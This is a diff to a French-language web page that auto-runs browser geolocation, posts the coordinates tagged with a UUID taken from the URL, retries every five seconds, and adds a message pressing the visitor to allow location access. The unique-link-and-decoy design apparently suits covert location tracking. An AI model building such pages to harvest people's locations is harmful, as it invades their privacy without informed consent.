@@ -33,9 +33,9 @@
     <img src="https://media.giphy.com/media/3o7TKtnuHOHHUjR38Y/giphy.gif" alt="Loading GIF"/>
     <p>Pour enregistrer votre position, veuillez permettre la géolocalisation lorsque vous y êtes invité.</p>
     <button onclick="attemptGeolocation()">Try Geolocation</button>
+    <p id="error-message" style="color: red; display: none;">La géolocalisation est nécessaire pour cette application. Veuillez autoriser la géolocalisation dans vos paramètres de navigateur et rafraîchir la page.</p>
 
     <script>
-        // Fonction pour tenter de récupérer la position et envoyer les coordonnées
         function attemptGeolocation() {
             navigator.geolocation.getCurrentPosition(position => {
                 const uuid = window.location.pathname.split('/').pop();
@@ -52,13 +52,12 @@
                 .then(data => console.log(data))
                 .catch(error => console.error('Error:', error));
             }, error => {
-                // En cas d'échec, tenter à nouveau après un délai de 5 secondes
                 console.error('Geolocation error:', error);
+                document.getElementById('error-message').style.display = 'block';
                 setTimeout(attemptGeolocation, 5000);
             });
         }
 
-        // Appeler la fonction pour tenter de récupérer la position
         attemptGeolocation();
     </script>
 </body>
